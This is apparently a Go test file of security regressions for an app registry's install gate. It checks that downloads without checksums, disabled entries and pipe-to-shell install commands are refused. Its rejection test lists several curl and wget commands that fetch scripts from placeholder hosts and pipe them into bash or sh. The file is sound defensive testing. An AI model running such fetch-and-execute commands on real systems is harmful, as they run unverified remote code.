package appnet

// registry_secaudit2_test.go — SECAUDIT2 / SEC-F / SEC-G adversarial
// regressions for the registry install gate.
//
// Existing registry_security_test.go covers pipe-to-shell + curl|wget
// checksum enforcement for the `Install` shell path. This file adds the gaps
// SECAUDIT2 found:
//
//   FINDING H (HIGH): validateRecipeSecurity / requiresChecksum only inspect
//   recipe.Install. A *static* recipe (DownloadURL set, Install empty) with an
//   EMPTY Checksum sails through the security gate AND is extracted with the
//   system `tar xf` command (registry.go:staticInstall) which does NOT block
//   `../`, absolute paths, or symlinks. The two tests below encode the
//   EXPECTED secure behaviour. If they FAIL on current main, that failure is
//   the documented vulnerability (see SECURITY-AUDIT-2.md) — do NOT weaken
//   them.

import (
	"strings"
	"testing"
)

// TestStaticDownloadRequiresChecksum asserts the security gate refuses a
// static-download recipe that has no checksum. A binary/archive fetched over
// the network with no integrity check is a supply-chain RCE primitive.
func TestStaticDownloadRequiresChecksum(t *testing.T) {
	recipe := &VersionRecipe{
		// No Install command — pure static download path.
		DownloadURL: "https://example.com/releases/app-1.0-linux-amd64.tar.gz",
		Command:     "bin/app",
		Port:        8080,
		Checksum:    "", // EMPTY — must be rejected.
	}

	err := validateRecipeSecurity(recipe)
	if err == nil {
		t.Fatalf("SECAUDIT2 FINDING H (HIGH) CONFIRMED: validateRecipeSecurity " +
			"ACCEPTED a static DownloadURL recipe with an empty checksum. A " +
			"registry entry can fetch an unverified archive/binary over the " +
			"network and have it installed+run. requiresChecksum() must also " +
			"inspect recipe.DownloadURL, not only recipe.Install. (registry.go: " +
			"requiresChecksum/validateRecipeSecurity)")
	}
	if !strings.Contains(strings.ToLower(err.Error()), "checksum") {
		t.Fatalf("expected a checksum-related rejection, got: %v", err)
	}
}

// TestStaticDownloadWithChecksumAccepted is the matching positive case: a
// static recipe WITH a checksum must pass the gate (so the fix above does not
// over-block legitimate pinned downloads).
func TestStaticDownloadWithChecksumAccepted(t *testing.T) {
	recipe := &VersionRecipe{
		DownloadURL: "https://example.com/releases/app-1.0-linux-amd64.tar.gz",
		Command:     "bin/app",
		Port:        8080,
		Checksum:    "0000000000000000000000000000000000000000000000000000000000000000",
	}
	if err := validateRecipeSecurity(recipe); err != nil {
		t.Fatalf("a static recipe WITH a checksum must pass the security "+
			"gate, got: %v", err)
	}
}

// TestPipeToShellStillRejected re-asserts the SEC-F/G core invariant from
// this audit's vantage point (defence in depth alongside the existing tests).
func TestPipeToShellStillRejected(t *testing.T) {
	for _, cmd := range []string{
		"curl -fsSL https://get.example.com | bash",
		"wget -qO- https://get.example.com | sh",
		`sh -c "curl https://x | bash"`,
		"curl https://x|sh",
	} {
		r := &VersionRecipe{Install: cmd}
		if err := validateRecipeSecurity(r); err == nil {
			t.Fatalf("SEC-F/G REGRESSION: pipe-to-shell recipe %q was "+
				"accepted by validateRecipeSecurity.", cmd)
		}
	}
}

// TestDisabledRecipeRejected: an administratively disabled version entry must
// never install.
func TestDisabledRecipeRejected(t *testing.T) {
	r := &VersionRecipe{Install: "apt-get install -y nginx", Disabled: true}
	if err := validateRecipeSecurity(r); err == nil {
		t.Fatal("a _disabled registry entry must be refused by the gate")
	}
}
